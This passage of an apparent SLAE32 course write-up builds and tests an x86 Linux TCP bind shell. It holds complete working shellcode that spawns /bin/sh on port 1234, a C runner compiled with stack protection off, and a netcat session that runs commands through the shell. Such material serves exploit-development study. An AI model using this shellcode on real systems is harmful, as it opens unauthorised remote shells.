# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\xb7\x50\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80";</code></pre><!--kg-card-begin: markdown--><p>As I mentioned previously in the sidenotes, the script requires the following binaries:</p>
<ul>
<li><code>objcopy</code> (from the package <code>binutils</code>)</li>
<li><code>nasm</code> (from the homonymous package)</li>
<li><code>ld</code> (The GNU linker)</li>
</ul>
<p>The python script and the <code>NASM</code> template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/1/attempt/final/automation">attempt/final/automation</a>.</p>
<!--kg-card-end: markdown--><h2 id="testing">Testing</h2><p>As regards the testing phase, I decided to use the python script to generate shellcode for a Bind Shell listening on the TCP port <code>1234</code>:</p><pre><code class="language-bash">python3 script.py -p 1234 -t ./template.nasm -o /tmp/output.nasm

# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 130 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";</code></pre><p>To test the shellcode generated by the python script, I used the following C <code>shellcode runner</code>:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";

main() {
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}</code></pre><p>Compile and run it:</p><pre><code class="language-bash">gcc -fno-stack-protector -z execstack -o tcp_bind_shell shellcode_runner.c
./tcp_bind_shell</code></pre><p>Finally, I confirmed I could connect with <code>netcat</code> and execute commands:</p><pre><code class="language-bash">rbct@slae:~$ nc 127.0.0.1 1234
whoami
# rbct
id
# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
exit
rbct@slae:~$</code></pre>